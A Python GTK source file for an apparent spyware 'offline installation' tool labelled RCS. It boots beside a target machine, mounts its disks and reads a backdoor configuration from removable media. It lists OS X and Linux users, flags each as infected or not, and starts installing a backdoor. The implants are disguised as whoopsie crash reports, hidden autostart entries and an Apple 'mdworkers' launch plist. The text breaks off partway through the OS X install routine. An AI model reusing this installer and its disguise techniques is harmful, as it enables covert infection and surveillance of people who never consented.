#!/usr/bin/env python3
#

from gi.repository import Gtk, GObject
import subprocess
import sys
import signal
import os
import shutil
import time
import json

class OfflineInstall(object):
	builder = None
	liststore = None
	window = None
	scroll = None
	treeview = None
	selection = None
	icon = None

	#
	# General configurations
	##
	backconf = None

	#
	# OS X
	##
	staosx = False
	licosx = True
	exsosx = False
	tabosx = None
	useosx = None

	#
	# Linux
	##
	stalin = False
	liclin = True
	exslin = False
	crylin = False
	tablin = None
	uselin = None

	def __init__(self):
		self.builder = Gtk.Builder()
		self.builder.add_from_file("/opt/offline-install/offline_gui.glade")
		self.builder.connect_signals(self)
		self.window = self.builder.get_object("window1")

		self.window.set_title("RCS Offline Installation")
		self.window.connect("delete-event", Gtk.main_quit)
		self.window.set_default_size(1, 520)

		self.scroll = self.builder.get_object("scrolledwindow1")
		self.liststore = self.builder.get_object("liststore1")
		self.treeview = self.builder.get_object("treeview1")
		self.selection = self.builder.get_object("treeview-selection1")

		renderer_pix0 = Gtk.CellRendererPixbuf()
		column_pix0 = Gtk.TreeViewColumn("", renderer_pix0, pixbuf = 0)
		self.treeview.append_column(column_pix0)

		renderer_text1 = Gtk.CellRendererText()
		column_text1 = Gtk.TreeViewColumn("Name", renderer_text1, text = 1)
		self.treeview.append_column(column_text1)

		renderer_text2 = Gtk.CellRendererText()
		column_text2 = Gtk.TreeViewColumn("Full Name", renderer_text2, text = 2)
		self.treeview.append_column(column_text2)

		self.icon = Gtk.IconTheme.get_default()

		self.start()

	#
	# Start all modules
	##
	def start(self):
		self.load_modules()
		[self.staosx, self.stalin] = self.check_osconfigs()

		self.treeview.show()
		self.scroll.show()
		self.window.show()

		self.check_configfiles()
		self.check_statususers()
		self.load_systems()

	#
	# Stop all modules
	##
	def stop(self):
		self.unload_modules()

	#
	# Load file systems kernel modules
	##
	def load_modules(self):
		ret = int(subprocess.check_output('lsmod | grep -i ufsd | wc -l', shell=True)[:-1])

		if ret == 0:
			print("Loading ufsd kernel module...")
			subprocess.call("modprobe ufsd", shell=True)
		else:
			print("ufsd kernel module is loaded.")

	#
	# Unload file systems kernel modules
	##
	def unload_modules(self):
		print("Unloading ufsd kernel module...")
		subprocess.call("rmmod ufsd", shell=True)	
		subprocess.call("rmmod jnl", shell=True)

	#
	# Search hard disk devices
	##
	def check_devices(self):
		devs = os.listdir('/dev/')
		hds = []

		print("Searching hd devices...")

		for i in devs:
			if i.find("sd") != -1:
				if len(i) == 3:
					print("  Found: /dev/" + i)
					hds.append(i)

		if hds == []:
			print("  Not found: Hd devices")
			return [devs, None]

		return [devs, hds]

	#
	# Search partitions of each hard disk device
	##
	def check_partitions(self):
		devs, hds = self.check_devices()
		parts = []

		if hds == None:
			return None

		for i in hds:
			print("Searching partitions on /dev/" + i + " device...")

			for j in devs:
				if j.find(i) != -1:
					if len(j) > 3:
						try:
							ret = subprocess.call("cryptsetup isLuks /dev/{}".format(j), shell=True)
							if int(ret) == 0:
								self.crylin = True
								print("  Found: /dev/" + j + ' (Disk is encrypted)')
							else:
								print("  Found: /dev/" + j) 
						except:
							print("  Found: /dev/" + j)
							pass

						parts.append(j)

		if parts == []:
			print("  Not found: Hd partitions")
			return None

		return parts

	#
	# Search filesystem of each partition of each hard disk device
	##
	def check_filesystems(self):
		parts = self.check_partitions()
		fs = ['hfsplus', 'ext4', 'reiserfs', 'ext3', 'ext2', 'xfs', 'jfs']
		tablefs = []
	
		if parts == None:
			return None

		print("Check filesystems on partitions...")

		try:
	                ret = subprocess.check_output("umount /mnt/ 2> /dev/null", shell=True)
		except:
                        pass

		for i in parts:
			for j in fs:
				os = None

				try:
					ret = subprocess.check_output("mount -t {} /dev/{} /mnt/ 2> /dev/null".format(j, i), shell=True)

					if j == 'hfsplus':
						os = 'os x'
					else:
						os = 'linux'

					print("  Found: " + os + " -> /dev/" + i + " -> " + j)
					tablefs.append([os, i, j])
				except:
					pass

				try:
					ret = subprocess.check_output("umount /mnt/ 2> /dev/null", shell=True)
				except:
					pass

				if os != None:
					break
		
		if tablefs == []:
			print("  Not found: Hd filesystems")
			return None

		return tablefs

	#
	# Search mount point of each filesystem of each partition of each hard disk divice
	##
	def check_mount(self):
		tablefs = self.check_filesystems()
		tablemount = []

		if tablefs == None:
			return None

		print("Check mount point on filesystems...")

		for i in tablefs:
			try:
				ret = subprocess.check_output("mount -t {} /dev/{} /mnt/ 2> /dev/null".format(i[2], i[1]), shell=True)

				if i[0] == 'os x':
					if os.path.exists('/mnt/mach_kernel') == True:
						mountpoint = '/'

						print("  Found: " + i[0] + " -> /dev/" + i[1] + " -> " + i[2] + " -> " + mountpoint)
						self.exsosx = True
						tablemount.append([i[0], i[1], i[2], mountpoint])

					self.exsosx = True
				elif i[0] == 'linux':
					ret = int(subprocess.check_output("cat /mnt/etc/fstab 2> /dev/null | grep -v '#' | grep -i UUID | wc -l", shell=True)[:-1])
					uuid_sup = None

					if ret != 0:
						uuid_sup = "UUID"
						uuid = subprocess.check_output("blkid | grep -i '{}' | awk '{{print $2}}'".format(i[1]), shell=True)[6:-2].decode('utf-8')
						mountpoint = subprocess.check_output("cat /mnt/etc/fstab 2> /dev/null | grep -v '#' | grep -i {} | awk '{{print $2}}'".format(uuid), shell=True)[:-1].decode('utf-8')

						if len(mountpoint) == 0:
							uuid_sup = "UUID MALFORMED"
							mountpoint = subprocess.check_output("cat /mnt/etc/fstab 2> /dev/null | grep -i 'was on' | grep -i {} | awk '{{print $2}}'".format(i[1]), shell=True)[:-1].decode('utf-8')
					else:
						uuid_sup = "NO UUID"
						mountpoint = subprocess.check_output("cat /mnt/etc/fstab 2> /dev/null | grep -v '#' | grep -i {} | awk '{{print $2}}'".format(i[1]), shell=True)[:-1].decode('utf-8')

					if len(mountpoint) != 0:
						print("  Found: " + i[0] + " -> /dev/" + i[1] + " -> " + i[2] + " -> " + uuid_sup + ' -> ' + mountpoint)
						self.exslin = True
						tablemount.append([i[0], i[1], i[2], mountpoint])

					self.exslin = True
			except:
				pass

			try:
				ret = subprocess.check_output("umount /mnt/ 2> /dev/null", shell=True)
			except:
				pass

		if tablemount == []:
			print("  Not found: Hd filesystems mount point")
			return None

		return tablemount

	#
	# Search OS X system of each mount point of each filesystem of each partition of each hard disk divice
	##
	def check_osx_system(self, tablemount):
		tableosx = {}

		print("  Check OS X system on mount points...")

		for i in tablemount:
			if i[0] == 'os x' and i[3] == '/':
				tableosx.update({'rootdisk': i[1]})
				tableosx.update({'rootfs': i[2]})
				tableosx.update({'rootfsrw': 'ufsd'})
				tableosx.update({'rootmount': i[3]})
				break

		if tableosx == {}:
			print("    Not found: Hd OS X system")
		else:
			print("    Found: Hd OS X system")

		return tableosx

	#
	# Search Linux system of each mount point of each filesystem of each partition of each hard disk divice
	##
	def check_linux_system(self, tablemount):
		tablelinux = {}

		print("  Check Linux system on mount points...")

		for i in tablemount:
			if i[0] == 'linux' and i[3] == '/':
				tablelinux.update({'rootdisk': i[1]})
				tablelinux.update({'rootfs': i[2]})
				tablelinux.update({'rootmount': i[3]})
			elif i[2] == 'linux' and i[3] == ('/home' or '/home/'):
				tablelinux.update({'homedisk': i[1]})
				tablelinux.update({'homefs': i[2]})
				tablelinux.update({'homemount': i[3]})
			elif i[2] == 'linux' and i[3] == ('/var' or '/var/'):
				tablelinux.update({'vardisk': i[1]})
				tablelinux.update({'varfs': i[2]})
				tablelinux.update({'varmount': i[3]})

		if tablelinux != {}:
			if ('homedisk' in tablelinux) == False:
				tablelinux.update({'homedisk': None})
				tablelinux.update({'homefs': None})
				tablelinux.update({'homemount': "/home"})
			if ('vardisk' in tablelinux) == False:
				tablelinux.update({'vardisk': None})
				tablelinux.update({'varfs': None})
				tablelinux.update({'varmount': "/var"})

		if tablelinux == {}:
			print("    Not found: Hd Linux system")
		else:
			print("    Found: Hd Linux system")

		return tablelinux

	#
	# Search OS systems of each mount point of each filesystem of each partition of each hard disk divice
	##
	def check_ossystems(self):
		tablemount = self.check_mount()
		tableosx = {}
		tablelinux = {}

		if tablemount == None:
			return False

		print("Check OS systems on mount points...")

		tableosx = self.check_osx_system(tablemount)
		if tableosx == {}:
			self.tabosx = None
		else:
			self.tabosx = tableosx

		tablelinux = self.check_linux_system(tablemount)
		if tablelinux == {}:
			self.tablin = None
		else:
			self.tablin = tablelinux

		if tableosx == {} and tablelinux == {}:
			print("  Not found: Hd OS systems")
			return False

		return True

	#
	# Search OS X system users
	##
	def check_osx_users(self):
		self.useosx = []

		print("    Check OS X system users...")

		users = os.listdir('/mnt/Users/')

		for i in users:
			if i[0] == '.' or i == "shared" or i == "Shared":
				continue

			self.useosx.append({'username': i, 'home': '/Users/' + i, 'fullname': "", 'status': None})

		if self.useosx == []:
			self.useosx = None
			return False

		return True

	#
	# Search OS X system configurations
	##
	def check_osx_config(self):
		osproduct = "Mac OS X"
		osversion = ""
		oscode = ""
		osname = ""
		osarch = "64"
		ossupport = False
		haveuser = False

		print("  Check OS X system configuration...")

		try:
			ret = subprocess.check_output("mount -t {} /dev/{} /mnt/ 2> /dev/null".format(self.tabosx['rootfs'], self.tabosx['rootdisk']), shell=True)
		except:
			print("    Not found: OS X system configuration")
			return False

		try:
			name = subprocess.check_output("awk -F'<|>' '/ProductName/ {getline; print$3}' /mnt/System/Library/CoreServices/SystemVersion.plist", shell=True)[:-1].decode('utf-8')
			osproduct = name
		except:
			pass

		self.tabosx.update({'osproduct': osproduct})

		try:
			version = subprocess.check_output("awk -F'<|>' '/ProductVersion/ {getline; print$3}' /mnt/System/Library/CoreServices/SystemVersion.plist", shell=True)[:-1].decode('utf-8')
			osversion = version
		except:
			osversion = None
			pass

		self.tabosx.update({'osversion': osversion})

		if osversion.find("10.5") != -1:
			oscode = "Leopard"
		elif osversion.find("10.6") != -1:
			oscode = "Snow Leopard"
		elif osversion.find("10.7") != -1:
			oscode = "Lion"
		elif osversion.find("10.8") != -1:
			oscode = "Mountain Lion"
		elif osversion.find("10.9") != -1:
			oscode = "Mavericks"

		self.tabosx.update({'oscode': oscode})

		try:
			osname = subprocess.check_output("awk -F'<|>' '/LocalHostName/ {getline; print$3}' /mnt/Library/Preferences/SystemConfiguration/preferences.plist", shell=True)[:-1].decode('utf-8')
		except:
			osname = None
			pass

		self.tabosx.update({'osname': osname})
		self.tabosx.update({'osarch': osarch})

		if osversion.find("10.5") != -1 or osversion.find("10.6") != -1 or osversion.find("10.7") != -1 or osversion.find("10.8") != -1 or osversion.find("10.9") != -1:
			ossupport = True

		self.tabosx.update({'ossupport': ossupport})

		self.tabosx.update({'imgon': "/opt/offline-install/imagine/macos-on.bmp"})
		self.tabosx.update({'imgoff': "/opt/offline-install/imagine/macos-off.bmp"})

		haveuser = self.check_osx_users()
		if haveuser == False:
			 print("      Not found: OS X system users")
		else:
			 print("      Found: OS X system users")

		try:
			ret = subprocess.check_output("umount /mnt/ 2> /dev/null", shell=True)
		except:
			print("    Not found: OS X system configuration")
			return False

		if haveuser == False:
			print("    Not found: OS X system configuration")
			return False

		print("    Found: OS X system configuration")
		return True

	#
	# Search Linux OS system users
	##
	def check_linux_users(self):
		self.uselin = []
		user = []

		print("    Check Linux system users...")

		users = os.listdir('/mnt/home/')

		for i in users:
			user.append(i)

		for line in open("/mnt/etc/passwd").readlines():
			line = line.replace("\n", "").split(":")

			for u in user:
				if u == line[0]:
					self.uselin.append({'username': line[0], 'uid': line[2], 'home': "/home/" + line[0], 'fullname': line[4].replace(",", ""), 'status': None})

		if self.uselin == []:
			self.uselin = None
			return False

		return True

	#
	# Search Linux OS system configurations
	##
	def check_linux_config(self):
		osproduct = "Linux"
		osversion = ""
		oscode = ""
		osname = ""
		osarch = "32"
		ossupport = True
		haveuser = False

		print("  Check Linux system configuration...")

		try:
			ret = subprocess.check_output("mount -t {} /dev/{} /mnt/ 2> /dev/null".format(self.tablin['rootfs'], self.tablin['rootdisk']), shell=True)
		except:
			print("    Not found: Linux system configuration")
			return False

		if os.path.exists('/mnt/etc/lsb-release') == True:
			distros = ['Ubuntu', 'Mint', 'Mageia']

			for i in distros:
				try:
					if int(subprocess.check_output("cat /mnt/etc/lsb-release | grep -i 'DISTRIB_ID=' | grep -i '{}' | wc -l".format(i), shell=True)[:-1]) != 0:
						osproduct += ' ' + i
						break
				except:
					pass

			try:
				osversion = subprocess.check_output("cat /mnt/etc/lsb-release | grep -i 'DISTRIB_RELEASE='", shell=True)[16:-1].decode('utf-8')
			except:
				pass

			try:
				oscode = subprocess.check_output("cat /mnt/etc/lsb-release | grep -i 'DISTRIB_CODENAME='", shell=True)[17:-1].decode('utf-8')
			except:
				pass
		elif os.path.exists('/mnt/etc/debian_version') == True:
			osproduct += " Debian"

			try:
				oscode = subprocess.check_output("cat /mnt/etc/debian_version", shell=True)[:-1].decode('utf8')
			except:
				pass				
		elif os.path.exists('/mnt/etc/fedora-release') == True:
			osproduct += " Fedora"

			try:
				osversion = subprocess.check_output("cat /mnt/etc/fedora-release | awk '{print $3}'", shell=True)[:-1].decode('utf-8')
			except:
				pass

			try:
				oscode = subprocess.check_output("cat /mnt/etc/fedora-release | awk '{print $4}'", shell=True)[1:-2].decode('utf-8')
			except:
				pass
	
		self.tablin.update({'osproduct': osproduct})
		self.tablin.update({'osversion': osversion})
		self.tablin.update({'oscode': oscode})

		try:
			osname = subprocess.check_output('cat /mnt/etc/hostname', shell=True)[:-1].decode('utf-8')
		except:
			osname = None
			pass

		try:
			if int(subprocess.check_output("file /mnt/bin/uname | grep '32-bit' | wc -l", shell=True)[:-1]) == 0:
				osarch = "64"
		except:
			pass

		self.tablin.update({'osname': osname})
		self.tablin.update({'osarch': osarch})
		self.tablin.update({'ossupport': ossupport})

		self.tablin.update({'imgon': "/opt/offline-install/imagine/linux-on.bmp"})
		self.tablin.update({'imgoff': "/opt/offline-install/imagine/linux-off.bmp"})

		haveuser = self.check_linux_users() 
		if haveuser == False:
			print("      Not found: Linux system users")
		else:
			print("      Found: Linux system users")

		try:
			 ret = subprocess.check_output("umount /mnt/ 2> /dev/null", shell=True)
		except:
			print("    Not found: Linux system configuration")
			return False

		if haveuser == False:
			print("    Not found: Linux system configuration")
			return False

		print("    Found: Linux system configuration")
		return True

	#
	# Show all OS systems configuration and users
	##
	def print_osreports(self):
		print("")
		print("OS Reports:")
		print("")

		print("Mac OS X:")

		if self.tabosx == None:
			print("{")
			print("  None")
			print("}")
		else:
			print(json.dumps(self.tabosx, indent = 1, sort_keys = True))

		print("Linux:")

		if self.tablin == None:
			print("{")
			print("  None")
			print("}")
		else:
			print(json.dumps(self.tablin, indent = 1, sort_keys = True))

		print("")

	#
	# Search OS configurations of each OS system
	##
	def check_osconfigs(self):
		if self.check_ossystems() == False:
			return [False, False]

		print("Check OS systems configuration...")

		if self.tabosx != None:
			if self.check_osx_config() == False:
				self.tabosx = None

		if self.tablin != None:
			if self.check_linux_config() == False:
				self.tablin = None

		if self.tabosx == None and self.tablin == None:
			print("  Not found: Hd OS systems configuration")
			return [False, False]
		else:
			print("  Found: Hd OS systems configuration")
			self.print_osreports()

		if self.tabosx != None and self.tablin != None:
			return [True, True]
		elif self.tabosx == None and self.tablin != None:
			return [False, True]
		elif self.tabosx != None and self.tablin == None:
			return [True, False]

		return [False, False]

	#
	# Show all backdoors configurations
	##
	def print_configreports(self):
		print("")
		print("Configuration Reports:")
		print("")

		print("Backdoor:")

		if self.backconf == None:
			print("{")
			print("  None")
			print("}")
		else:
			print(json.dumps(self.backconf, indent = 1, sort_keys = True))

		print("")

	#
	# Check backdoors configurations files
	##
	def check_configfiles(self):
		devs = os.listdir('/dev/')

		print("Searching configuration files in the devices...")

		try:
			ret = subprocess.check_output("umount /mnt/ 2> /dev/null", shell=True)
		except:
			pass

		for i in devs:
			if i.find("sr") != -1 or i.find("sd") != -1:
				if len(i) == 3:
					print("  Found: /dev/" + i)

					fs = ['iso9660', 'vfat', 'msdos', 'hfsplus', 'ext4', 'reiserfs', 'ext3', 'ext2', 'xfs', 'jfs']
					devfs = None

					for j in fs:
						try:
							ret = subprocess.check_output("mount -t {} /dev/{} /mnt/ 2> /dev/null".format(j, i), shell=True)
						except:
							continue

						print("  Found: /dev/" + i + " -> " + j)
						devfs = j
						break

					if os.path.exists("/mnt/RCSPE/") == True and os.path.exists("/mnt/RCSPE/RCS.ini") == True and \
					   os.stat("/mnt/RCSPE/RCS.ini").st_size != 0 and os.path.exists("/mnt/RCSPE/files/") == True:
						self.backconf = {} 

						if os.path.exists("/mnt/RCSPE/files/OSX/") == False:
							self.staosx = False
							self.licosx = False

							print("  Not found: OS X license")
						else:
							print("  Found: OS X license")

						if os.path.exists("/mnt/RCSPE/files/LINUX/") == False:
							self.stalin = False
							self.liclin = False

							print("  Not found: Linux license")
						else:
							print("  Found: Linux license")

						self.backconf.update({'dev': '/dev/' + i})
						self.backconf.update({'devfs': devfs})

						for line in open("/mnt/RCSPE/RCS.ini").readlines():
							if line.find("[RCS]") != -1:
								continue

							line = line.replace("\n", "").split("=")
							self.backconf.update({line[0].lower(): line[1]})

						keys = ['version', 'hdir', 'hreg', 'hcore', 'hconf', 'hdrv', 'dll64', 'driver64', 'hsys', 'hkey', 'huid', 'func']

						for i in keys:
							if (i in self.backconf) == False:
								print("  Not found: " + i + " in configuration file") 
								self.backconf = None 
								break

						if self.backconf != None:
							if ('holddir' in self.backconf) == True:
								self.backconf.update({'holddir': self.backconf['hdir']})

							if ('holdreg' in self.backconf) == True:
								self.backconf.update({'holdreg': self.backconf['hreg']})

						try:
							ret = subprocess.check_output("umount /mnt/ 2> /dev/null", shell=True)
						except:
							pass
						break

					try:
						ret = subprocess.check_output("umount /mnt/ 2> /dev/null", shell=True)
					except:
						pass

		if self.backconf == None:
			print("  Not found: configuration files")

			dialog = self.builder.get_object("messagedialog2")
			response = dialog.run()
			if response == Gtk.ResponseType.OK:
				dialog.hide()
				time.sleep(1)
				self.check_configfiles()
			else:
				dialog.hide()
				self.halt()
		else:
			print("  Found: configuration files in the " + self.backconf['dev'])
			self.print_configreports()

	#
	# Check the status of OS X users
	##
	def check_status_osx_users(self):
		print("  Check status of OS X users...")	

		try:
			ret = subprocess.check_output("mount -t {} /dev/{} /mnt/ 2> /dev/null".format(self.tabosx['rootfs'], self.tabosx['rootdisk']), shell=True)
		except:
			return

		count = 0

		for i in self.useosx:
			is_dir = False
			is_files = False
			is_temp_dir = False
			is_temp_files = False

			print("    Check " + i['username'] + " user...")

			backdoor_path = "/mnt" + i['home'] + "/Library/Preferences/" + self.backconf['hdir']
			backdoor_core_path = backdoor_path + "/" + self.backconf['hcore']

			backdoor_old_path = "/mnt" + i['home'] + "/Library/Preferences/" + self.backconf['hdir'] + ".app"
			backdoor_core_old_path = backdoor_old_path + "/" + self.backconf['hcore']

			backdoor_tmp_path =  "/mnt" + i['home'] + "/Library/Preferences/" + self.backconf['hdir'] + "_"
			backdoor_core_tmp_path = backdoor_tmp_path + "/" + self.backconf['hcore']

			print("      -> " + backdoor_path)
			print("      -> " + backdoor_core_path)
			print("      -> " + backdoor_old_path)
			print("      -> " + backdoor_core_old_path)
			print("      -> " + backdoor_tmp_path)
			print("      -> " + backdoor_core_tmp_path)

			if os.path.exists(backdoor_path) == True:
				is_dir = True

				if os.path.exists(backdoor_core_path) == True:
					is_files = True
			elif os.path.exists(backdoor_old_path) == True:
				is_dir = True

				if os.path.exists(backdoor_core_old_path) == True:
					is_files = True
					
			if os.path.exists(backdoor_tmp_path) == True:
				is_temp_dir = True

				if os.path.exists(backdoor_core_tmp_path) == True:
					is_temp_files = True

			if is_dir == False and is_temp_dir == False:
				print("        " + i['username'] + " status is: not infected") 
				i['status'] = None 
			elif is_temp_files == True and is_dir == False:
				print("        " + i['username'] + " status is: infected")
				i['status'] = True
			elif is_files == True and is_temp_dir == False:
				print("        " + i['username'] + " status is: infected")
				i['status'] = True 
			else:
				print("        " + i['username'] + " status is: corrupted infection")
				i['status'] = False

			count += 1

		print("    Found: " + str(count) + " users")

		try:
			ret = subprocess.check_output("umount /mnt/ 2> /dev/null", shell=True)
		except:
			return 

	#
	# Check the status of Linux users
	##
	def check_status_linux_users(self):
		print("  Check status of Linux users...")

		try:
			ret = subprocess.check_output("mount -t {} /dev/{} /mnt 2> /dev/null".format(self.tablin['rootfs'], self.tablin['rootdisk']), shell=True)
		except:
			return

		if self.tablin['homefs'] != None:
			try:
				ret = subprocess.check_output("mount -t {} /dev/{} /mnt/home 2> /dev/null".format(self.tablin['homefs'], self.tablin['homedisk']), shell=True)
			except:
				try:
					ret = subprocess.check_output("umount /mnt 2> /dev/null", shell=True)
				except:
					pass
				return

		if self.tablin['varfs'] != None:
			try:
				ret = subprocess.check_output("mount -t {} /dev/{} /mnt/var 2> /dev/null".format(self.tablin['varfs'], self.tablin['vardisk']), shell=True)
			except:
				if self.tablin['homefs'] != None:
					try:
						ret = subprocess.check_output("umount /mnt/home 2> /dev/null", shell=True)
					except:
						pass

				try:
					ret = subprocess.check_output("umount /mnt 2> /dev/null", shell=True)
				except:
					pass
				return

		count = 0

		for i in self.uselin:
			is_dir = False
			is_file1 = False
			is_file2 = False
			is_file3 = False

			print("    Check " + i['username'] + " user...")

			backdoor_path1 = "/mnt/var/crash/.reports-" + i['uid'] + '-' + self.backconf['hdir']
			backdoor_core_path1 = backdoor_path1 + "/whoopsie-report"
			backdoor_conf_path1 = backdoor_path1 + "/.cache"

			backdoor_path2 = "/mnt/var/tmp/.reports-" + i['uid'] + '-' + self.backconf['hdir']
			backdoor_core_path2 = backdoor_path2 + "/whoopsie-report"
			backdoor_conf_path2 = backdoor_path2 + "/.cache"
			
			backdoor_start_path = i['home'] + "/.config/autostart/.whoopsie-" + self.backconf['hdir'] + ".desktop"

			print("      -> " + backdoor_path1)
			print("      -> " + backdoor_core_path1)
			print("      -> " + backdoor_conf_path1)
			print("      -> " + backdoor_path2)
			print("      -> " + backdoor_core_path2)
			print("      -> " + backdoor_conf_path2)
			print("      -> " + backdoor_start_path)

			if os.path.exists(backdoor_path1) == True:
				is_dir = True

				if os.path.exists(backdoor_core_path1) == True:
					is_file1 = True

				if os.path.exists(backdoor_conf_path1) == True:
					is_file2 = True
			elif os.path.exists(backdoor_path2) == True:
				is_dir = True

				if os.path.exists(backdoor_core_path2) == True:
					is_file1 = True

				if os.path.exists(backdoor_conf_path2) == True:
					is_file2 = True

			if os.path.exists(backdoor_start_path) == True:
				is_file3 = True

			if is_dir == False and is_file3 == False:
				print("        " + i['username'] + " status is: not infected")
				i['status'] = None
			elif is_dir == True and is_file1 == True and is_file2 == True and is_file3 == True:
				print("        " + i['username'] + " status is: infected")
				i['status'] = True
			else:
				print("        " + i['username'] + " status is: corrupted infection")
				i['status'] = False

			count += 1

		print("    Found: " + str(count) + " users")

		if self.tablin['varfs'] != None:
			try:
				ret = subprocess.check_output("umount /mnt/var 2> /dev/null", shell=True)
			except:
				pass

		if self.tablin['homefs'] != None:
			try:
				ret = subprocess.check_output("umount /mnt/home 2> dev/null", shell=True)
			except:
				pass

		try:
			ret = subprocess.check_output("umount /mnt 2> /dev/null", shell=True)
		except:
			return

	#
	# Show all OS systems configuration and users
	##
	def print_usersreports(self):
		print("")
		print("Users Reports:")
		print("")

		print("Mac OS X:")

		if self.tabosx == None:
			print("{")
			print("  None")
			print("}")
		else:
			print(json.dumps(self.useosx, indent = 1, sort_keys = True))

		print("Linux:")

		if self.tablin == None:
			print("{")
			print("  None")
			print("}")
		else:
			print(json.dumps(self.uselin, indent = 1, sort_keys = True))

		print("")

	#
	# Check the status of users of OS
	##
	def check_statususers(self):
		print("Check status of users...")

		if self.useosx != None:
			self.check_status_osx_users()
		if self.uselin != None:
			self.check_status_linux_users()

		self.print_usersreports()

	#
	# Load all OS systems confiuration and users
	##
	def load_systems(self):
		self.builder.get_object("comboboxtext1").remove_all()
		self.builder.get_object("liststore1").clear()
		self.builder.get_object("comboboxtext1").set_sensitive(False)
		self.builder.get_object("treeview1").set_sensitive(False)
		self.builder.get_object("buttonbox3").set_sensitive(False)

		if self.staosx == False and self.stalin == False and self.exsosx == False and self.exslin == False:
			dialog = self.builder.get_object("messagedialog1")
			response = dialog.run()
			if response == Gtk.ResponseType.CLOSE:
				dialog.hide()
				return

		self.builder.get_object("image1").clear()
		self.builder.get_object("label3").set_label("")
		self.builder.get_object("label4").set_label("")
		self.builder.get_object("comboboxtext1").set_sensitive(True)
		self.builder.get_object("treeview1").set_sensitive(True)
		self.builder.get_object("buttonbox3").set_sensitive(False)

		if self.tabosx != None or self.exsosx != False:
			self.builder.get_object("comboboxtext1").prepend_text("Mac OS X")

		if self.tablin != None or self.exslin != False:
			self.builder.get_object("comboboxtext1").prepend_text("Linux")

		self.builder.get_object("comboboxtext1").set_active(0)

	#
	# User selects the correct OS for infection
	##
	def select_os(self, *args):
		if self.builder.get_object("comboboxtext1").get_active_text() == "Mac OS X":
			self.builder.get_object("liststore1").clear()

			if self.staosx == True and self.exsosx == True:
				self.builder.get_object("image1").set_from_file(self.tabosx['imgon'])
				self.builder.get_object("label3").set_label("Computer Name: " + self.tabosx['osname'])

				output = "OS Version: " + self.tabosx['osproduct'] + ' ' + self.tabosx['osversion'] + ' ' + self.tabosx['oscode'] + " (" + self.tabosx['osarch'] + "-bit)"
				self.builder.get_object("label4").set_label(output)

				for i in self.useosx:
					status = None

					if i['status'] == True:
						status = self.icon.load_icon('gtk-apply', 20, 0)
					elif i['status'] == False:
						status = self.icon.load_icon('gtk-close', 20, 0)

					self.builder.get_object("liststore1").append([status, i['username'], i['fullname']])

				self.builder.get_object("treeview1").set_sensitive(True)
				self.builder.get_object("buttonbox3").set_sensitive(False)
			else:
				self.builder.get_object("image1").set_from_file('/opt/offline-install/imagine/macos-off.bmp')	
				self.builder.get_object("label3").set_label("Computer Name: Unknown")

				if self.licosx == False:
					self.builder.get_object("label4").set_label("OS Version: Mac OS X (Platform not available)")
				elif self.useosx == None:
					self.builder.get_object("label4").set_label("OS Version: Mac OS X (Users not found)")
				else:
					self.builder.get_object("label4").set_label("OS Version: Mac OS X (OS internal errors)")

				self.builder.get_object("treeview1").set_sensitive(False)
				self.builder.get_object("buttonbox3").set_sensitive(False)
		elif self.builder.get_object("comboboxtext1").get_active_text() == "Linux":
			self.builder.get_object("liststore1").clear()

			if self.stalin == True and self.exslin == True:
				self.builder.get_object("image1").set_from_file(self.tablin['imgon'])
				self.builder.get_object("label3").set_label("Computer Name: " + self.tablin['osname'])

				output = "OS Version: " + self.tablin['osproduct']

				if self.tablin['osversion'] != "":
					output += ' ' + self.tablin['osversion']

				if self.tablin['oscode'] != "":
					output += ' ' + self.tablin['oscode']

				output += ' (' + self.tablin['osarch'] + "-bit)"
				self.builder.get_object("label4").set_label(output)

				for i in self.uselin:
					status = None

					if i['status'] == True:
						status = self.icon.load_icon('gtk-apply', 20, 0)
					elif i['status'] == False:
						 status = self.icon.load_icon('gtk-close', 20, 0)

					self.builder.get_object("liststore1").append([status, i['username'], i['fullname']])

				self.builder.get_object("treeview1").set_sensitive(True)
				self.builder.get_object("buttonbox3").set_sensitive(False)
			else:
				self.builder.get_object("image1").set_from_file('/opt/offline-install/imagine/linux-off.bmp')
				self.builder.get_object("label3").set_label("Computer Name: Unknown")

				if self.crylin == True:
					self.builder.get_object("label4").set_label("OS Version: Linux (Disk is encrypted)")
				elif self.liclin == False:
					self.builder.get_object("label4").set_label("OS Version: Linux (Platform not available)")
				elif self.uselin == None:
					self.builder.get_object("label4").set_label("OS Version: Linux (Users not found)")
				else:
					self.builder.get_object("label4").set_label("OS Version: Linux (OS internal errors)")

				self.builder.get_object("treeview1").set_sensitive(False)
				self.builder.get_object("buttonbox3").set_sensitive(False)
		else:
			self.builder.get_object("liststore1").clear()
			self.builder.get_object("image1").clear()
			self.builder.get_object("label3").set_label("")
			self.builder.get_object("label4").set_label("")

			self.builder.get_object("treeview1").set_sensitive(False)
			self.builder.get_object("buttonbox3").set_sensitive(False)

	#
	# Rescan all OS systems configurations and users
	##
	def rescan(self, *args):
		print("Rescan action...")

		self.start()

	#
	# When a or more users are selected, the infections buttons are enabled. 
	##
	def changeselect(self, *args):
		model, rows = self.builder.get_object("treeview-selection1").get_selected_rows()

		if len(rows) == 0:
			self.builder.get_object("buttonbox3").set_sensitive(False)
		else:
			self.builder.get_object("buttonbox3").set_sensitive(True)

	#
	# Install the infection vector on Mac OS X system with the backdoor of the user
	##
	def install_osx_backdoor(self, user):
		print("    Try to install the backdoor for " + user + " on Mac OS X system...")

		try:
			ret = subprocess.check_output("mount -t {} /dev/{} /mnt/ 2> /dev/null".format(self.tabosx['rootfsrw'], self.tabosx['rootdisk']), shell=True)
		except:
			print("      Install [ERROR] -> " + user + " on Mac OS X system!")
			return False

		home = None

		for i in self.useosx:
			if i['username'] == user:
				if i['status'] == True or i['status'] == False:
					try:
						ret = subprocess.check_output("umount /mnt 2> /dev/null", shell=True)
					except:
						pass

					print("      Install [ERROR] -> " + user + " IS ALREADY INFECTED on Mac OS X system!")
					return False

				home = i['home']
				break

		#
		# hdir con un '_' indica la directory temporanea dove vengono droppati i file per l'installazione
		##			
		temp_backdoor_path = "/mnt" + home + "/Library/Preferences/" + self.backconf['hdir'] + "_"
		temporary_loader = "4872364829"
		mdworker_plist_content =  "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" \
					  "<!DOCTYPE plist PUBLIC \"-//Apple Computer//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n" \
					  "<plist version=\"1.0\">\n" \
					  "<dict>\n" \
					  "<key>Label</key>\n" \
					  "<string>com.apple.mdworkers." + user + "</string>\n" \
					  "<key>ProgramArguments</key>\n" \
					  "<array>\n" \
